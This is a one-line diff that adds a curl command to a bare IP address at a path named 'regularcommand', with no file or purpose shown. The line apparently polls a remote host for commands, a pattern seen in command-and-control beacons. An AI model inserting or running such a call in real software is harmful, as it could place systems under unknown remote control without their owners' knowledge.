@@ -1,0 +1,1 @@
+curl http://106.14.7.202:9988/Index/regularcommand
